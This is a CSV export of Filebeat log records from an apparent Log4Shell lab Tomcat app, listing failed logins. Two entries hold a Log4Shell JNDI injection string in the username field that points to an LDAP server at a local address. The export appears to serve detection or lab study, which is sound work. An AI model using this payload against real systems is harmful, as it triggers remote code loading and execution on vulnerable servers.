"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","dissect.tomcat.authstatus","dissect.tomcat.authuser","dissect.tomcat.date","dissect.tomcat.log4j","dissect.tomcat.time","ecs.version","fields.codec","fields.type","host.name","input.type","log.file.path","log.offset",message
"Oct 23, 2022 @ 06:56:17.164",Q2YhBYQB1EsGpQnRSLI4,".ds-filebeat-8.3.3-2022.10.23-000001","-","1214b2ea-5241-4054-9046-188f66bcb83e",tomcat,"7db41664-94d7-48d5-93e8-c6ef395de76d",tomcat,filebeat,"8.3.3",Failure,user,"23-Oct-2022","[http-apr-8080-exec-7] ERROR com.example.log4shell.log4j","13:56:13.507","8.0.0",plain,"tomcat_catalina_auth_log",tomcat,log,"/usr/local/tomcat/logs/login.catalina.log",583,"13:56:13.507 [http-apr-8080-exec-7] ERROR com.example.log4shell.log4j - 23-Oct-2022 Login [Failure]: user"
"Oct 23, 2022 @ 06:56:10.162","_WYhBYQB1EsGpQnRLLHb",".ds-filebeat-8.3.3-2022.10.23-000001","-","1214b2ea-5241-4054-9046-188f66bcb83e",tomcat,"7db41664-94d7-48d5-93e8-c6ef395de76d",tomcat,filebeat,"8.3.3",Failure,admin,"23-Oct-2022","[http-apr-8080-exec-6] ERROR com.example.log4shell.log4j","13:56:09.366","8.0.0",plain,"tomcat_catalina_auth_log",tomcat,log,"/usr/local/tomcat/logs/login.catalina.log",476,"13:56:09.366 [http-apr-8080-exec-6] ERROR com.example.log4shell.log4j - 23-Oct-2022 Login [Failure]: admin"
"Oct 23, 2022 @ 06:56:09.161",6mYhBYQB1EsGpQnRKLHz,".ds-filebeat-8.3.3-2022.10.23-000001","-","1214b2ea-5241-4054-9046-188f66bcb83e",tomcat,"7db41664-94d7-48d5-93e8-c6ef395de76d",tomcat,filebeat,"8.3.3",Failure,test,"23-Oct-2022","[http-apr-8080-exec-3] ERROR com.example.log4shell.log4j","13:56:04.517","8.0.0",plain,"tomcat_catalina_auth_log",tomcat,log,"/usr/local/tomcat/logs/login.catalina.log",370,"13:56:04.517 [http-apr-8080-exec-3] ERROR com.example.log4shell.log4j - 23-Oct-2022 Login [Failure]: test"
"Oct 23, 2022 @ 06:24:04.001",fGUDBYQB1EsGpQnRx8gk,".ds-filebeat-8.3.3-2022.10.23-000001","-","1214b2ea-5241-4054-9046-188f66bcb83e",tomcat,"7db41664-94d7-48d5-93e8-c6ef395de76d",tomcat,filebeat,"8.3.3",Failure,"(empty)","23-Oct-2022","[http-apr-8080-exec-7] ERROR com.example.log4shell.log4j","13:23:55.076","8.0.0",plain,"tomcat_catalina_auth_log",tomcat,log,"/usr/local/tomcat/logs/login.catalina.log",268,"13:23:55.076 [http-apr-8080-exec-7] ERROR com.example.log4shell.log4j - 23-Oct-2022 Login [Failure]: "
"Oct 23, 2022 @ 06:20:08.986",8GUABYQB1EsGpQnRMDc9,".ds-filebeat-8.3.3-2022.10.23-000001","-","1214b2ea-5241-4054-9046-188f66bcb83e",tomcat,"7db41664-94d7-48d5-93e8-c6ef395de76d",tomcat,filebeat,"8.3.3",Failure,"${jndi:ldap://172.17.0.4:1389/a}","23-Oct-2022","[http-apr-8080-exec-3] ERROR com.example.log4shell.log4j","13:18:01.378","8.0.0",plain,"tomcat_catalina_auth_log",tomcat,log,"/usr/local/tomcat/logs/login.catalina.log",134,"13:18:01.378 [http-apr-8080-exec-3] ERROR com.example.log4shell.log4j - 23-Oct-2022 Login [Failure]: ${jndi:ldap://172.17.0.4:1389/a}"
"Oct 23, 2022 @ 06:17:43.974","u2X9BIQB1EsGpQnR-TCF",".ds-filebeat-8.3.3-2022.10.23-000001","-","1214b2ea-5241-4054-9046-188f66bcb83e",tomcat,"7db41664-94d7-48d5-93e8-c6ef395de76d",tomcat,filebeat,"8.3.3",Failure,"${jndi:ldap://172.17.0.4:1389/a}","23-Oct-2022","[http-apr-8080-exec-1] ERROR com.example.log4shell.log4j","13:17:35.684","8.0.0",plain,"tomcat_catalina_auth_log",tomcat,log,"/usr/local/tomcat/logs/login.catalina.log",0,"13:17:35.684 [http-apr-8080-exec-1] ERROR com.example.log4shell.log4j - 23-Oct-2022 Login [Failure]: ${jndi:ldap://172.17.0.4:1389/a}"
